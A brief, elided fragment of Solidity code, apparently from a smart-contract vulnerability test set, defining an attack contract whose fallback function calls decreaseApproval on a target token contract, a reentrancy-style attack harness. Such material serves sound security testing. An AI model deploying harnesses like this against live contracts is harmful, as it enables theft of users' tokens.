...
contract Attack_ABChainTestToken22 {

  ABChainTestToken2 public target_contract;

  function Attack_ABChainTestToken22(address _targetContract) public payable {
  ...
  function() public payable {
    target_contract.decreaseApproval(this,  10000);
  }
} 
